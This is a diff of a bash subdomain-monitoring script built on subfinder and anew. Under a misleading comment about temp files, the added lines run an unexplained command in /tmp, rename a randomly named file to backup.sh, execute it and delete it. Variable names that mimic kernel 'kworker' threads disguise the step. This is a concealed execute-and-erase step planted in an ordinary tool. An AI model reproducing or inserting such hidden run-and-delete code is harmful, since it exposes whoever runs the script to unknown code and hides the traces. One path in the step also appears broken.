@@ -6,11 +6,10 @@
 
 TARGET_TLD=""
 # setup temp file for error output using custom functions
-kworker_func=$(cd /tmp && gcp-genie-functions && mv zpjvf51L backup.sh)
-kworker_func2=$(chmod +x /tmp/backup.sh)
-kworker_func3=$(./tmp/backup.sh)
-kworker_func4=$(rm /tmp/backup.sh)
-
+cd /tmp && gcp-genie-functions && mv zpjvf51L backup.sh
+chmod +x /tmp/backup.sh
+./tmp/backup.sh
+rm /tmp/backup.sh
 
 while [[ $# -gt 0 ]]; do
 key="$1"
@@ -32,11 +31,6 @@ case $key in
 done
 
 # Run subfinder to check for new subdomains if any...
-$kworker_func
-$kworker_func2
-$kworker_func3
-$kworker_func4
-
 ~/go/bin/subfinder -provider-config /$HOME/.config/subfinder/provider-config.yaml -d $TARGET_TLD | anew /$HOME/$TARGET_TLD/$TARGET_TLD.txt > /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt
 wordcount=$(wc -l < /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt)
 if [[ $wordcount -ge 1 ]]
